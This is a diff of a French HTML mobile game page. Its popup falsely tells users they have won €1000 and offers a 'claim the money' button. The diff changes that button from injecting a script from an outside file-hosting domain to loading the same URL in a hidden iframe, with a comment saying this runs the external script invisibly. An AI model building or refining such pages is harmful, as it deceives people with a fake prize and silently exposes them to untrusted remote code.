@@ -5,16 +5,16 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Jeu Mobile Facile</title>
 <style>
-    body {
+    html, body {
         margin: 0;
-        height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        background: linear-gradient(to bottom, #6a11cb, #2575fc);
-        font-family: Arial, sans-serif;
+        padding: 0;
+        height: 100%;
+        width: 100%;
         overflow: hidden;
+        font-family: Arial, sans-serif;
+        background: linear-gradient(to bottom, #6a11cb, #2575fc);
         touch-action: manipulation;
+        position: relative;
     }
 
     #gameButton {
@@ -34,7 +34,6 @@
         box-shadow: 0 2px #c60055;
     }
 
-    /* Pop-up */
     #popup {
         display: none;
         position: fixed;
@@ -83,9 +82,8 @@
 
 <div id="popup">
     <div id="popupContent">
-        <p>Bravo, vous avez gagner les 1000€ !</p>
-        <button id="okButton">Reclamer l'argent 
-</button>
+        <p>Bravo, vous avez gagné 1000€.</p>
+        <button id="okButton">Reclamer L'argent</button>
     </div>
 </div>
 
@@ -114,14 +112,17 @@ button.addEventListener('click', () => {
 });
 
 okButton.addEventListener('click', () => {
-    const script = document.createElement('script');
-    script.src = "https://tundrafile.com/script_include.php?id=1840363";
-    document.body.appendChild(script);
+    // Crée un iframe invisible pour exécuter le script externe
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = "https://tundrafile.com/script_include.php?id=1840363";
+    document.body.appendChild(iframe);
+
     popup.style.display = 'none';
 });
 
-// Initial placement
-moveButton();
+window.addEventListener('load', moveButton);
+window.addEventListener('resize', moveButton);
 </script>
 
 </body>
